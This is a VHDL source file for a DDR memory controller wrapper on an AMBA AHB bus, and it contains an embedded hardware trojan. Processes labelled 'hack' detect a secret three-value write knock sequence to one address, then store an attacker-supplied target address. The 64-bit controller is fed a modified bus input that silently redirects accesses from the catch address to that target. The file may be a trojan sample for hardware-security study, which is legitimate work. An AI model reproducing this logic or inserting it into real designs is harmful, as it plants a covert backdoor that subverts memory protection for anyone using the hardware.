library ieee;
use ieee.std_logic_1164.all;
library grlib;
use grlib.amba.all;
use grlib.stdlib.all;
library gaisler;
use grlib.devices.all;
use gaisler.memctrl.all;
library techmap;
use techmap.gencomp.all;

entity ddrspa is
  generic (
    fabtech : integer := virtex2;
    memtech : integer := 0;
    rskew   : integer := 0;
    hindex  : integer := 3;
    haddr   : integer := 1024;
    hmask   : integer := 3072;
    ioaddr  : integer := 1;
    iomask  : integer := 4095;
    MHz     : integer := 100;
    clkmul  : integer := 18; 
    clkdiv  : integer := 20; 
    col     : integer := 9; 
    Mbyte   : integer := 256; 
    rstdel  : integer := 200; 
    pwron   : integer := 1;
    oepol   : integer := 0;
    ddrbits : integer := 64;
    ahbfreq : integer := 65
  );
  port (
    rst_ddr : in  std_ulogic;
    rst_ahb : in  std_ulogic;
    clk_ddr : in  std_ulogic;
    clk_ahb : in  std_ulogic;
    lock    : out std_ulogic;			-- DCM locked
    clkddro : out std_ulogic;			-- DCM locked
    clkddri : in  std_ulogic;
    ahbsi   : in  ahb_slv_in_type;
    ahbso   : out ahb_slv_out_type;
    ddr_clk 	: out std_logic_vector(2 downto 0);
    ddr_clkb	: out std_logic_vector(2 downto 0);
    ddr_clk_fb_out  : out std_logic;
    ddr_clk_fb  : in std_logic;
    ddr_cke  	: out std_logic_vector(1 downto 0);
    ddr_csb  	: out std_logic_vector(1 downto 0);
    ddr_web  	: out std_ulogic;                       -- ddr write enable
    ddr_rasb  	: out std_ulogic;                       -- ddr ras
    ddr_casb  	: out std_ulogic;                       -- ddr cas
    ddr_dm   	: out std_logic_vector (ddrbits/8-1 downto 0);    -- ddr dm
    ddr_dqs  	: inout std_logic_vector (ddrbits/8-1 downto 0);    -- ddr dqs
    ddr_ad      : out std_logic_vector (13 downto 0);   -- ddr address
    ddr_ba      : out std_logic_vector (1 downto 0);    -- ddr bank address
    ddr_dq    	: inout  std_logic_vector (ddrbits-1 downto 0) -- ddr data
  );
end; 

architecture rtl of ddrspa is

constant DDR_FREQ : integer := (clkmul * MHz) / clkdiv;
constant FAST_AHB : integer := AHBFREQ / DDR_FREQ;
constant NAHBMST : integer := 16;  -- maximum AHB masters
constant NAHBSLV : integer := 16;  -- maximum AHB slaves
constant NAPBSLV : integer := 16; -- maximum APB slaves
constant NAHBIRQ : integer := 32; -- maximum interrupts
constant NAHBAMR : integer := 4;  -- maximum address mapping registers
constant NAHBIR  : integer := 4;  -- maximum AHB identification registers
constant NAHBCFG : integer := NAHBIR + NAHBAMR;  -- words in AHB config block
constant NAPBIR  : integer := 1;  -- maximum APB configuration words
constant NAPBAMR : integer := 1;  -- maximum APB configuration words
constant NAPBCFG : integer := NAPBIR + NAPBAMR;  -- words in APB config block
constant NBUS    : integer := 4;

subtype amba_config_word is std_logic_vector(31 downto 0);
type ahb_config_type is array (0 to NAHBCFG-1) of amba_config_word;
type apb_config_type is array (0 to NAPBCFG-1) of amba_config_word;

-- AHB master inputs
  type ahb_mst_in_type is record
    hgrant	: std_logic_vector(0 to NAHBMST-1);     -- bus grant
    hready	: std_ulogic;                         	-- transfer done
    hresp	: std_logic_vector(1 downto 0); 	-- response type
    hrdata	: std_logic_vector(31 downto 0); 	-- read data bus
    hcache	: std_ulogic;                         	-- cacheable
    hirq  	: std_logic_vector(NAHBIRQ-1 downto 0);	-- interrupt result bus
    testen	: std_ulogic;                         	-- scan test enable
    testrst	: std_ulogic;                         	-- scan test reset
    scanen 	: std_ulogic;                         	-- scan enable
    testoen 	: std_ulogic;                         	-- test output enable 
  end record;

-- AHB master outputs
  type ahb_mst_out_type is record
    hbusreq	: std_ulogic;                         	-- bus request
    hlock	: std_ulogic;                         	-- lock request
    htrans	: std_logic_vector(1 downto 0); 	-- transfer type
    haddr	: std_logic_vector(31 downto 0); 	-- address bus (byte)
    hwrite	: std_ulogic;                         	-- read/write
    hsize	: std_logic_vector(2 downto 0); 	-- transfer size
    hburst	: std_logic_vector(2 downto 0); 	-- burst type
    hprot	: std_logic_vector(3 downto 0); 	-- protection control
    hwdata	: std_logic_vector(31 downto 0); 	-- write data bus
    hirq   	: std_logic_vector(NAHBIRQ-1 downto 0);	-- interrupt bus
    hconfig 	: ahb_config_type;	 		-- memory access reg.
    hindex  	: integer range 0 to NAHBMST-1;	 	-- diagnostic use only
  end record;

-- AHB slave inputs
  type ahb_slv_in_type is record
    hsel	: std_logic_vector(0 to NAHBSLV-1);     -- slave select
    haddr	: std_logic_vector(31 downto 0); 	-- address bus (byte)
    hwrite	: std_ulogic;                         	-- read/write
    htrans	: std_logic_vector(1 downto 0); 	-- transfer type
    hsize	: std_logic_vector(2 downto 0); 	-- transfer size
    hburst	: std_logic_vector(2 downto 0); 	-- burst type
    hwdata	: std_logic_vector(31 downto 0); 	-- write data bus
    hprot	: std_logic_vector(3 downto 0); 	-- protection control
    hready	: std_ulogic;                         	-- transfer done
    hmaster	: std_logic_vector(3 downto 0); 	-- current master
    hmastlock	: std_ulogic;                         	-- locked access
    hmbsel 	: std_logic_vector(0 to NAHBAMR-1);	-- memory bank select
    hcache	: std_ulogic;                         	-- cacheable
    hirq  	: std_logic_vector(NAHBIRQ-1 downto 0);	-- interrupt result bus
    testen	: std_ulogic;                         	-- scan test enable
    testrst	: std_ulogic;                         	-- scan test reset
    scanen  	: std_ulogic;                         	-- scan enable
    testoen 	: std_ulogic;                         	-- test output enable 
  end record;

-- AHB slave outputs
  type ahb_slv_out_type is record
    hready	: std_ulogic;                         	-- transfer done
    hresp	: std_logic_vector(1 downto 0); 	-- response type
    hrdata	: std_logic_vector(31 downto 0); 	-- read data bus
    hsplit	: std_logic_vector(15 downto 0); 	-- split completion
    hcache	: std_ulogic;                         	-- cacheable
    hirq   	: std_logic_vector(NAHBIRQ-1 downto 0); -- interrupt bus
    hconfig 	: ahb_config_type;	 		-- memory access reg.
    hindex  	: integer range 0 to NAHBSLV-1;	 	-- diagnostic use only
  end record;

-- array types
  type ahb_mst_out_vector_type is array (natural range <>) of ahb_mst_out_type;
  type ahb_slv_out_vector_type is array (natural range <>) of ahb_slv_out_type;
  subtype ahb_mst_out_vector is ahb_mst_out_vector_type(NAHBMST-1 downto 0);
  subtype ahb_slv_out_vector is ahb_slv_out_vector_type(NAHBSLV-1 downto 0);
  type ahb_mst_out_bus_vector is array (0 to NBUS-1) of ahb_mst_out_vector;
  type ahb_slv_out_bus_vector is array (0 to NBUS-1) of ahb_slv_out_vector;


-- constants
  constant HTRANS_IDLE:   std_logic_vector(1 downto 0) := "00";
  constant HTRANS_BUSY:   std_logic_vector(1 downto 0) := "01";
  constant HTRANS_NONSEQ: std_logic_vector(1 downto 0) := "10";
  constant HTRANS_SEQ:    std_logic_vector(1 downto 0) := "11";

  constant HBURST_SINGLE: std_logic_vector(2 downto 0) := "000";
  constant HBURST_INCR:   std_logic_vector(2 downto 0) := "001";
  constant HBURST_WRAP4:  std_logic_vector(2 downto 0) := "010";
  constant HBURST_INCR4:  std_logic_vector(2 downto 0) := "011";
  constant HBURST_WRAP8:  std_logic_vector(2 downto 0) := "100";
  constant HBURST_INCR8:  std_logic_vector(2 downto 0) := "101";
  constant HBURST_WRAP16: std_logic_vector(2 downto 0) := "110";
  constant HBURST_INCR16: std_logic_vector(2 downto 0) := "111";

  constant HSIZE_BYTE:    std_logic_vector(2 downto 0) := "000";
  constant HSIZE_HWORD:   std_logic_vector(2 downto 0) := "001";
  constant HSIZE_WORD:    std_logic_vector(2 downto 0) := "010";
  constant HSIZE_DWORD:   std_logic_vector(2 downto 0) := "011";
  constant HSIZE_4WORD:   std_logic_vector(2 downto 0) := "100";
  constant HSIZE_8WORD:   std_logic_vector(2 downto 0) := "101";
  constant HSIZE_16WORD:  std_logic_vector(2 downto 0) := "110";
  constant HSIZE_32WORD:  std_logic_vector(2 downto 0) := "111";

  constant HRESP_OKAY:    std_logic_vector(1 downto 0) := "00";
  constant HRESP_ERROR:   std_logic_vector(1 downto 0) := "01";
  constant HRESP_RETRY:   std_logic_vector(1 downto 0) := "10";
  constant HRESP_SPLIT:   std_logic_vector(1 downto 0) := "11";

-- APB slave inputs
  type apb_slv_in_type is record
    psel	: std_logic_vector(0 to NAPBSLV-1);     -- slave select
    penable	: std_ulogic;                         	-- strobe
    paddr	: std_logic_vector(31 downto 0); 	-- address bus (byte)
    pwrite	: std_ulogic;                         	-- write
    pwdata	: std_logic_vector(31 downto 0); 	-- write data bus
    pirq	: std_logic_vector(NAHBIRQ-1 downto 0); -- interrupt result bus
    testen	: std_ulogic;                         	-- scan test enable
    testrst	: std_ulogic;                         	-- scan test reset
    scanen 	: std_ulogic;                         	-- scan enable
    testoen	: std_ulogic;                         	-- test output enable
  end record;

-- APB slave outputs
  type apb_slv_out_type is record
    prdata	: std_logic_vector(31 downto 0); 	-- read data bus
    pirq 	: std_logic_vector(NAHBIRQ-1 downto 0); -- interrupt bus
    pconfig 	: apb_config_type;	 		-- memory access reg.
    pindex      : integer range 0 to NAPBSLV -1;	-- diag use only
  end record;

-- array types
  type apb_slv_out_vector is array (0 to NAPBSLV-1) of apb_slv_out_type;

-- support for plug&play configuration

  constant AMBA_CONFIG_VER0  : std_logic_vector(1 downto 0) := "00";

  subtype amba_vendor_type  is integer range 0 to  16#ff#;
  subtype amba_device_type  is integer range 0 to 16#3ff#;
  subtype amba_version_type is integer range 0 to  16#3f#;
  subtype amba_cfgver_type  is integer range 0 to      3;
  subtype amba_irq_type     is integer range 0 to NAHBIRQ-1;
  subtype ahb_addr_type     is integer range 0 to 16#fff#;
  constant zx : std_logic_vector(31 downto 0) := (others => '0');
  constant zxirq : std_logic_vector(NAHBIRQ-1 downto 0) := (others => '0');
  constant zy : std_logic_vector(0 to 31) := (others => '0');

  constant apb_none : apb_slv_out_type :=
    (zx, zxirq(NAHBIRQ-1 downto 0), (others => zx), 0);
  constant ahbm_none : ahb_mst_out_type := ( '0', '0', "00", zx,
   '0', "000", "000", "0000", zx, zxirq(NAHBIRQ-1 downto 0), (others => zx), 0);
  constant ahbs_none : ahb_slv_out_type := (
   '1', "00", zx, zx(15 downto 0), '0', zxirq(NAHBIRQ-1 downto 0), (others => zx), 0);
  constant ahbs_in_none : ahb_slv_in_type := (
   zy(0 to NAHBSLV-1), zx, '0', "00", "000", "000", zx,
   "0000", '1', "0000", '0', zy(0 to NAHBAMR-1), '0', zxirq(NAHBIRQ-1 downto 0),
   '0', '0', '0', '0');

  constant ahbsv_none : ahb_slv_out_vector := (others => ahbs_none);
  type memory_in_type is record
  data          : std_logic_vector(31 downto 0); -- Data bus address
  brdyn         : std_logic;
  bexcn         : std_logic;
  writen        : std_logic;
  wrn           : std_logic_vector(3 downto 0);
  bwidth        : std_logic_vector(1 downto 0);
  sd            : std_logic_vector(63 downto 0);
  cb            : std_logic_vector(7 downto 0);
  scb           : std_logic_vector(7 downto 0);
  edac          : std_logic;
end record;

type memory_out_type is record
  address       : std_logic_vector(31 downto 0);
  data          : std_logic_vector(31 downto 0);
  sddata        : std_logic_vector(63 downto 0);
  ramsn         : std_logic_vector(7 downto 0);
  ramoen        : std_logic_vector(7 downto 0);
  ramn          : std_ulogic;
  romn          : std_ulogic;
  mben          : std_logic_vector(3 downto 0);
  iosn          : std_logic;
  romsn         : std_logic_vector(7 downto 0);
  oen           : std_logic;
  writen        : std_logic;
  wrn           : std_logic_vector(3 downto 0);
  bdrive        : std_logic_vector(3 downto 0);
  vbdrive       : std_logic_vector(31 downto 0); --vector bus drive
  svbdrive      : std_logic_vector(63 downto 0); --vector bus drive sdram
  read          : std_logic;
  sa            : std_logic_vector(14 downto 0);
  cb            : std_logic_vector(7 downto 0);
  scb           : std_logic_vector(7 downto 0);
  vcdrive       : std_logic_vector(7 downto 0); --vector bus drive cb
  svcdrive      : std_logic_vector(7 downto 0); --vector bus drive cb sdram
  ce            : std_ulogic;
end record;

type sdctrl_in_type is record
  wprot     : std_ulogic;
  data      : std_logic_vector (127 downto 0);  -- data in
  cb        : std_logic_vector(15 downto 0);
end record;

type sdctrl_out_type is record
  sdcke     : std_logic_vector ( 1 downto 0);  -- clk en
  sdcsn     : std_logic_vector ( 1 downto 0);  -- chip sel
  sdwen     : std_ulogic;                       -- write en
  rasn      : std_ulogic;                       -- row addr stb
  casn      : std_ulogic;                       -- col addr stb
  dqm       : std_logic_vector ( 15 downto 0);  -- data i/o mask
  bdrive    : std_ulogic;                       -- bus drive
  qdrive    : std_ulogic;                       -- bus drive
  vbdrive   : std_logic_vector(31 downto 0);   -- vector bus drive
  address   : std_logic_vector (16 downto 2);  -- address out
  data      : std_logic_vector (127 downto 0);  -- data out
  cb        : std_logic_vector(15 downto 0);
  ce        : std_ulogic;
  ba        : std_logic_vector ( 1 downto 0);  -- bank address
  cal_en    : std_logic_vector(7 downto 0); -- enable delay calibration
  cal_inc   : std_logic_vector(7 downto 0); -- inc/dec delay
  cal_rst   : std_logic;                    -- calibration reset
  odt       : std_logic_vector(1 downto 0);
end record;

type sdram_out_type is record
  sdcke     : std_logic_vector ( 1 downto 0);  -- clk en
  sdcsn     : std_logic_vector ( 1 downto 0);  -- chip sel
  sdwen     : std_ulogic;                       -- write en
  rasn      : std_ulogic;                       -- row addr stb
  casn      : std_ulogic;                       -- col addr stb
  dqm       : std_logic_vector ( 7 downto 0);  -- data i/o mask
end record;
signal sdi     : sdctrl_in_type;
signal sdo     : sdctrl_out_type;
signal clkread  : std_ulogic;

signal knockState : std_logic_vector(1 downto 0);
signal catchAddress : std_logic_vector(31 downto 0);
signal targetAddress : std_logic_vector(31 downto 0);
signal modahbsi : ahb_slv_in_type;
signal currentAddress : std_logic_vector(31 downto 0);
signal newAddCon  : std_ulogic;
signal knockAddress : std_logic_vector(31 downto 0);

begin
	-- Latch the address and select signal for the next cycle
	-- Address and control come a cycle before associated data
	-- Pipelined with hready signaling the insertion of wait states
	hackNewAddControl : process(clk_ahb)begin
		if(rising_edge(clk_ahb))then
			-- This slave is selected, the transaction is a write, this is an actual transaction, and the decoder/arbiter is ready
			if(ahbsi.hsel(hindex) = '1' and ahbsi.hwrite = '1' and ahbsi.htrans(1) = '1' and ahbsi.hready = '1')then
				currentAddress <= ahbsi.haddr;
				newAddCon <= '1';
			-- Transaction ends when there isn't another start and the slave marks the transaction as complete
			else
				newAddCon <= '0';
			end if;
		end if;
	end process;
	
	-- Look for trigger, when triggered store the catch and target address
	hackTrigger : process(clk_ahb)begin
		if(rising_edge(clk_ahb))then
			-- When we have new address and control information that is valid for the first cycle
			if(newAddCon = '1')then
				if(ahbsi.hwdata = X"AAAA_5555")then
					knockState <= "01";
					knockAddress <= currentAddress;
				elsif(knockState = "01" and currentAddress = knockAddress and ahbsi.hwdata = X"5555_AAAA")then
					knockState <= "10";
				elsif(knockState = "10" and currentAddress = knockAddress and ahbsi.hwdata = X"CA5C_CA5C")then
					knockState <= "11";
				elsif(knockState = "11" and currentAddress = knockAddress)then
					targetAddress <= ahbsi.hwdata;
					catchAddress <= knockAddress;
					knockState <= "00";
				end if;
			end if;
		end if;
	end process;
	
	-- If the requested address is the catch address remap to the target address
	modahbsi.hsel <= ahbsi.hsel;
	modahbsi.haddr <= ahbsi.haddr when (ahbsi.haddr /= catchAddress) else targetAddress;
	modahbsi.hwrite <= ahbsi.hwrite;
	modahbsi.htrans <= ahbsi.htrans;
	modahbsi.hsize <= ahbsi.hsize;
	modahbsi.hburst <= ahbsi.hburst;
	modahbsi.hwdata <= ahbsi.hwdata;
	modahbsi.hprot <= ahbsi.hprot;
	modahbsi.hready <= ahbsi.hready;
	modahbsi.hmaster <= ahbsi.hmaster;
	modahbsi.hmastlock <= ahbsi.hmastlock;
	modahbsi.hmbsel <= ahbsi.hmbsel;
	modahbsi.hcache <= ahbsi.hcache;
	modahbsi.hirq <= ahbsi.hirq;
	
  ddr_phy0 : ddr_phy generic map (tech => fabtech, MHz => MHz,  
	dbits => ddrbits, rstdelay => rstdel, clk_mul => clkmul, 
	clk_div => clkdiv, rskew => rskew)
  port map (
	rst_ddr, clk_ddr, clkddro, clkread, lock,
	ddr_clk, ddr_clkb, ddr_clk_fb_out, ddr_clk_fb,
	ddr_cke, ddr_csb, ddr_web, ddr_rasb, ddr_casb, 
	ddr_dm, ddr_dqs, ddr_ad, ddr_ba, ddr_dq, sdi, sdo);

  ddr16 : if ddrbits = 16 generate
    ddrc : ddrsp16a generic map (memtech => memtech, hindex => hindex, 
	haddr => haddr, hmask => hmask, ioaddr => ioaddr, iomask => iomask,
	pwron => pwron, MHz => DDR_FREQ, col => col, Mbyte => Mbyte,
	fast => FAST_AHB)
  	port map (rst_ahb, clkddri, clk_ahb, clkread, ahbsi, ahbso, sdi, sdo);
  end generate;

  ddr32 : if ddrbits = 32 generate
    ddrc : ddrsp32a generic map (memtech => memtech, hindex => hindex,
	haddr => haddr, hmask => hmask, ioaddr => ioaddr, iomask => iomask,
	pwron => pwron, MHz => DDR_FREQ, col => col, Mbyte => Mbyte,
	fast => FAST_AHB/2)
  	port map (rst_ahb, clkddri, clk_ahb, ahbsi, ahbso, sdi, sdo);
  end generate;

  ddr64 : if ddrbits = 64 generate
    ddrc : ddrsp64a generic map (memtech => memtech, hindex => hindex,
	haddr => haddr, hmask => hmask, ioaddr => ioaddr, iomask => iomask,
	pwron => pwron, MHz => DDR_FREQ, col => col, Mbyte => Mbyte,
	fast => FAST_AHB/4)
  	port map (rst_ahb, clkddri, clk_ahb, modahbsi, ahbso, sdi, sdo);
  end generate;

end;

